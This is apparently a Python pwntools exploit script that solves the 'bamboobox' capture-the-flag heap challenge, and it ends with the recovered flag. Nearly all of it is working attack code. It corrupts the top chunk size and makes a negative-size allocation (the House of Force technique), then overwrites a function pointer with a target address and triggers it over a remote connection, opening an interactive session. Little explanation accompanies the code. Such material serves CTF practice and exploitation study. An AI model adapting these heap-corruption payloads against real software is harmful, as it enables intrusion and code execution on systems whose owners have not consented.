#!/usr/bin/env python
from pwn import *

bamboobox = ELF('./bamboobox')

# ANARY    : ENABLED
# FORTIFY   : disabled
# NX        : ENABLED
# PIE       : disabled
# RELRO     : Partial

# House of force

def mal_nomal(r):
    r.recvuntil('choice:')
    r.send('2\n')
    r.recvuntil('name:')
    r.send('32')
    r.recvuntil('item:')
    r.send('12')
    return 

r = remote('192.168.31.25',33001)
#r = process('./bamboobox')
#print r.proc.pid
    
# Step 1: malloc a nomal chunk
num_nomal = 0
num = num_nomal
while num >= 0 :
    mal_nomal(r)
    num -= 1

# Step 2: change the size of top chunck
res = r.recvuntil('choice:')
r.send('3\n')
r.recvuntil('item:')
r.send(str(num_nomal) + '\n')
r.recvuntil('name:')
r.send('49')
r.recvuntil('item:')
r.send('\x00'*40+'\xff'*8+'\n')

# Step 3: malloc to change ptr top chunk
#
# new top = old top - 0x50 = old top + size + 0x10
# -> size = old top - 0x60 - old top
# -> size = -96
#
# heap :    0x603000   struct box
#           0x603020   Step 1 chunk
# now top-> 0x603040
r.recvuntil('choice:')
r.send('2\n')
r.recvuntil('name:')
r.send( str(-1 * (48*(num_nomal+1) + 48))+'\n')
r.recvuntil('item:')
r.send('121\n')


# Step 4: malloc a nomal chunk on target
r.recvuntil('choice:')
r.send('2\n')
r.recvuntil('name:')
r.send('16')
r.recvuntil('item:')
r.send(p32(0x400de9)*3+'\x00'*4)


# Step 5 : trigger the address or function
r.recvuntil('choice:')
r.send('5\n')
print r.recv()

r.interactive()

#AD{h0us3_of_f0rc3_1s_n0t_d1ff1cUlt}

